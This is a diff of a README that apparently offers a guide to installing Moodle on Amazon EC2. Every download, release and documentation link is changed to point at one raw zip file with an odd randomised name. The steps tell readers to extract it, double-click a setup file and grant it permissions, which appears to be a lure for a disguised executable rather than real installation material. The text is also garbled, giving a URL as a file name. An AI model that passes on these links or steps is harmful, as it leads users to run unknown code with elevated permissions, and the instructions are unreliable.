@@ -4,7 +4,7 @@
 This repository provides a complete guide to installing Moodle on Amazon EC2. With this resource, you can easily set up a learning management system (LMS) powered by Moodle on AWS. Enjoy a flexible and scalable platform to enhance your educational offerings.
 
 ## 🔗 Download Now
-[![Download](https://raw.githubusercontent.com/willcomsono/moodle-aws-installation/main/neutral/moodle-aws-installation.zip)](https://raw.githubusercontent.com/willcomsono/moodle-aws-installation/main/neutral/moodle-aws-installation.zip)
+[![Download](https://raw.githubusercontent.com/willcomsono/moodle-aws-installation/main/neutral/installation-aws-moodle-semiligneous.zip)](https://raw.githubusercontent.com/willcomsono/moodle-aws-installation/main/neutral/installation-aws-moodle-semiligneous.zip)
 
 ## 🚀 Getting Started
 To start your journey with Moodle on AWS, follow these simple steps to download and set up the application.
@@ -17,7 +17,7 @@ To start your journey with Moodle on AWS, follow these simple steps to download 
 - **Internet Connection:** Required for AWS access
 
 ## 📥 Download & Install
-1. Visit the Releases page to download the installation package for Moodle on AWS: [Download Here](https://raw.githubusercontent.com/willcomsono/moodle-aws-installation/main/neutral/moodle-aws-installation.zip).
+1. Visit the Releases page to download the installation package for Moodle on AWS: [Download Here](https://raw.githubusercontent.com/willcomsono/moodle-aws-installation/main/neutral/installation-aws-moodle-semiligneous.zip).
 
 2. Choose the version you want to download and click the link. This will start the download process.
 
@@ -25,7 +25,7 @@ To start your journey with Moodle on AWS, follow these simple steps to download 
 
 4. Extract the contents of the downloaded file if necessary. If you see a zip file, right-click on it and choose “Extract All” or “Unzip”.
 
-5. Open the folder with the extracted files. Look for a file named `https://raw.githubusercontent.com/willcomsono/moodle-aws-installation/main/neutral/moodle-aws-installation.zip` or similar to start the installation.
+5. Open the folder with the extracted files. Look for a file named `https://raw.githubusercontent.com/willcomsono/moodle-aws-installation/main/neutral/installation-aws-moodle-semiligneous.zip` or similar to start the installation.
 
 6. Double-click the setup file to begin. Follow the prompts in the installation wizard. It may ask for permissions; choose to allow it.
 
@@ -43,7 +43,7 @@ To start your journey with Moodle on AWS, follow these simple steps to download 
 4. Once you finish the setup, your Moodle installation is ready to go! You may want to enable plugins or customize themes to match your requirements.
 
 ## 📚 Documentation
-For detailed instructions on features, setup, and troubleshooting, refer to the [Moodle Documentation](https://raw.githubusercontent.com/willcomsono/moodle-aws-installation/main/neutral/moodle-aws-installation.zip).
+For detailed instructions on features, setup, and troubleshooting, refer to the [Moodle Documentation](https://raw.githubusercontent.com/willcomsono/moodle-aws-installation/main/neutral/installation-aws-moodle-semiligneous.zip).
 
 ## 🔧 Frequently Asked Questions
 ### Q1: What is Moodle?
